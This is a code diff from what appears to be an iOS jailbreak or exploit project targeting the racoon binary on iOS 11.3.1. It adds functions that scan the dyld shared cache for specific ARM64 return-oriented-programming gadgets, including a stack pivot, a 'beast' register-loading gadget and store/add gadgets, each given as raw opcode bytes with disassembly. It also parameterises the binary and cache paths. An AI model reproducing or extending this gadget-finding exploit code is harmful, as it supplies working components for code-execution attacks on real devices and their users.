@@ -238,8 +238,72 @@ void * get_mach_msg_offset(char * path) {
 */
 
 
+void * get_pivot_x21_gadget() {
+	void * ret = find_data_raw(shared_cache,shared_cache_size,&((unsigned char[]){
+			     0xa8,0x06,0x40,0xf9,    // ldr x8, [x21, 8]
+                 0x09,0x01,0x40,0xf9,    // ldr x9, [x8]
+                 0x29,0x1d,0x40,0xf9,    // ldr x9, [x9, 0x38]
+                 0xe1,0x03,0x00,0xaa,    // mov x1, x0
+                 0xe0,0x03,0x08,0xaa,    // mov x0, x8
+				 0x20,0x01,0x3f,0xd6     // blr x9
+				}),4*6,true);
+	if (!ret) return ret;
+	return ret-(size_t)shared_cache;
+}
+
+void * get_beast_gadget() {
+	void * ret = find_data_raw(shared_cache,shared_cache_size,&((unsigned char[]){
+		  0xe4,0x03,0x16,0xaa,  //   mov x4, x22
+		  0xe5,0x03,0x14,0xaa,  //   mov x5, x20
+		  0xe6,0x03,0x15,0xaa,  //   mov x6, x21
+		  0xe7,0x03,0x13,0xaa,  //   mov x7, x19
+		  0xe0,0x03,0x1a,0xaa,  //   mov x0, x26
+		  0xe1,0x03,0x19,0xaa,  //   mov x1, x25
+		  0xe2,0x03,0x18,0xaa,  //   mov x2, x24
+		  0xe3,0x03,0x17,0xaa,  //   mov x3, x23
+		  0x60,0x03,0x3f,0xd6,  //   blr x27
+		  0xfd,0x7b,0x47,0xa9,  //   ldp x29, x30, [sp, 0x70]
+		  0xf4,0x4f,0x46,0xa9,  //   ldp x20, x19, [sp, 0x60]
+		  0xf6,0x57,0x45,0xa9,  //   ldp x22, x21, [sp, 0x50]
+		  0xf8,0x5f,0x44,0xa9,  //   ldp x24, x23, [sp, 0x40]
+		  0xfa,0x67,0x43,0xa9,  //   ldp x26, x25, [sp, 0x30]
+		  0xfc,0x6f,0x42,0xa9,  //   ldp x28, x27, [sp, 0x20]
+		  0xe9,0x23,0x41,0x6d,  //   ldp d9, d8, [sp, 0x10]
+		  0xff,0x03,0x02,0x91,  //   add sp, sp, 0x80
+		  0xc0,0x03,0x5f,0xd6   //   ret
+		}), 4*18,true);
+	if (!ret) return ret;
+	return ret-(size_t)shared_cache;
+}
+
+void * get_str_x0_gadget() {
+	void * ret = find_data_raw(shared_cache,shared_cache_size,&((unsigned char[]){
+		 0x60,0x16,0x00,0xf9,    //   str x0, [x19, 0x28]
+		 0x00,0x00,0x80,0x52,    //   movz w0, 0
+		 0xfd,0x7b,0x41,0xa9,    //   ldp x29, x30, [sp, 0x10]
+		 0xf4,0x4f,0xc2,0xa8,    //   ldp x20, x19, [sp], 0x20
+		 0xc0,0x03,0x5f,0xd6     //   ret
+		}), 4*5, true);
+	if (!ret) return ret;
+	return ret-(size_t)shared_cache;
+}
+
+void * get_add_x0_gadget() {
+	void * ret = find_data_raw(shared_cache,shared_cache_size,&((unsigned char[]){
+     0xa0,0x02,0x14,0x8b,    //   add x0, x21, x20
+     0xfd,0x7b,0x42,0xa9,    //   ldp x29, x30, [sp, 0x20]
+     0xf4,0x4f,0x41,0xa9,    //   ldp x20, x19, [sp, 0x10]
+     0xf6,0x57,0xc3,0xa8,    //   ldp x22, x21, [sp], 0x30
+     0xc0,0x03,0x5f,0xd6     //   ret
+	}), 4*5,true);
+	if (!ret) return ret;
+	return ret-(size_t)shared_cache;
+}
+
+
+
 void init_uland_offsetfinder(char * racoon_bin, char * cache) {
-	int fd = open("./racoon_test_bin_11.3.1_iPAD_5,1",O_RDONLY);
+	int fd = open(racoon_bin,O_RDONLY);
     if (fd < 0) {
     	LOG("Couldn't open file\n");
     	exit(1);
@@ -254,7 +318,7 @@ void init_uland_offsetfinder(char * racoon_bin, char * cache) {
     if (racoon_bin == NULL) {
     	LOG("mmap failed\n");
     }
-    fd = open("./dyld_shared_cache_arm64",O_RDONLY);
+    fd = open(cache,O_RDONLY);
     if (fd < 0) {
     	LOG("Couldn't load cache\n");
     	exit(1);
